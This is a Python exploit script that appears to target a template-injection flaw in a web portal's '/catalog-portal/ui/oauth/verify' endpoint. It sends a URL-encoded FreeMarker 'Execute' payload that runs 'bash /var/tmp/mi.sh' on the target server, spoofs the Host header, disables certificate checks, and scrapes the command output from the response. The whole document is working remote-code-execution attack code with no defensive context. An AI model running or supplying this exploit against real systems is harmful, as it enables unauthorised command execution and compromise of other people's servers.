import requests
import os
import urllib.parse
import urllib3
import re
import colorama
import sys
from bs4 import BeautifulSoup



delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



cmd = urllib.parse.quote('bash /var/tmp/mi.sh')


domain = "https://" + sys.argv[1]
base_uri = "/catalog-portal/ui/oauth/verify?error=&deviceUdid="


payload="%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22"+str(cmd)+"%22%29%7d"
	
v = urllib.parse.quote(payload)
	
url = domain + base_uri + v
r = requests.get(url,headers={'Host':'localhost'}, verify=False)
status_code=r.status_code
v = r.text
re_dev1 = re.compile(r'device id:(.*?),')
re_dev2= re_dev1.findall(v)
command = re_dev2[0].replace('\\n','\r\n')
x =  requests.get(domain+base_uri+command, headers={'Host':'localhost'}, verify=False)
vv = str(x.text)

soup = BeautifulSoup(vv, 'html.parser')

bg =soup.find_all('script')
totti = str(bg)
varane = totti.replace('uid' ,'       \n\nuid')
messi = varane.replace("device", '   \n\ndevice')
mario = messi.replace('device id' ,'')
booba = mario.split()
print('\033[92m'+booba[19]+booba[20]+booba[21]+booba[22])

